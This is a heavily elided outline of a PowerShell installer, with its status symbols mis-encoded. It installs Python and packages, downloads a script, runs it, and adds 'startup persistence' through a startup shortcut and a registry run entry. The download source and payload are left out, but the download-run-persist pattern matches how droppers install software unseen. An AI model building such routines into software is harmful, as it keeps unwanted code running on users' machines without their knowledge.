...
function Install-Dependencies {
    ...
    foreach ($pkg in $packages) {
        ...
        try {
            ...
            if ($process.ExitCode -eq 0) {
                Write-Host "â $pkg installed successfully" -ForegroundColor Green
                continue
            }
        } catch {
        ...
        try {
            ...
            if ($process.ExitCode -eq 0) {
                Write-Host "â $pkg installed via easy_install" -ForegroundColor Green
                continue
            }
        } catch {
        ...
        Write-Host "â  Could not install $pkg, but continuing..." -ForegroundColor Yellow
    }
}
...
function Add-Startup {
    ...
    try {
        ...
        $Shortcut.Save()
        Write-Host "â Startup shortcut created successfully" -ForegroundColor Green
        return $true
    } catch {
    ...
    try {
        ...
        Write-Host "â Registry startup entry added" -ForegroundColor Green
        return $true
    } catch {
...
try {
    ...
    if (Test-Python) {
        Write-Host "â Python is available" -ForegroundColor Green
    } else {
        Write-Host "Python not found, installing..." -ForegroundColor Yellow
        $pythonPath = Install-Python
        
        if (-not $pythonPath) {
            Write-Host "â Python installation failed!" -ForegroundColor Red
            exit 1
        }
        
        # Verify Python works after installation
        if (-not (Test-Python)) {
            Write-Host "â Python not found after installation!" -ForegroundColor Red
            exit 1
        }
        
        Write-Host "â Python installed successfully" -ForegroundColor Green
    }
    ...
    try {
        ...
        Write-Host "â Script downloaded to: $scriptPath" -ForegroundColor Green
    } catch {
        Write-Host "â Failed to download script: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
    ...
    if (Test-Path $scriptPath) {
        ...
        Write-Host "â Script started successfully!" -ForegroundColor Green
        
        # Add to startup
        if (Add-Startup -ScriptPath $scriptPath) {
            Write-Host "â Startup persistence configured!" -ForegroundColor Green
        } else {
            Write-Host "â  Failed to configure startup, but script is running" -ForegroundColor Yellow
        }
    } else {
        Write-Host "â Script file not found after download" -ForegroundColor Red
    }
    
} catch {
    Write-Host "â Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
}
